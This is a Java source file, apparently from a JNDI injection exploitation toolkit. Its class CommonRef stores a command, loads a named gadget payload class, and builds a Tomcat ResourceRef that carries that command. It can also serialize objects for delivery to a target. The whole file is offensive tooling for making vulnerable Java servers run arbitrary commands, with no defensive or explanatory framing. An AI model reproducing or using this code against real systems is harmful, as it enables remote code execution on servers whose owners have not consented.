package jndi;

import org.apache.naming.ResourceRef;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Method;
import java.net.URL;
import payloads.face.ObjectPayload;

public class CommonRef {
    private String command;

    public CommonRef(String command) {
        this.command = command;
    }

    public CommonRef(URL codebase, String command) {
        this.command = command;
    }

    public byte[] serialize(Object ref) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(ref);

        return out.toByteArray();
    }

    @SuppressWarnings("rawtypes")
    public ResourceRef execByRef(String gadgetType, String wrapperType) throws Exception {
        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass("payloads.reference."+gadgetType);
        if (payloadClass == null || !ObjectPayload.class.isAssignableFrom(payloadClass)) {
            throw new IllegalArgumentException("No such Deserial Payload Name: " + gadgetType);
        }
        Method method = payloadClass.getMethod("getObject", String.class);
        ResourceRef ref = (ResourceRef) method.invoke(payloadClass.newInstance(), this.command);
        return ref;
    }
}
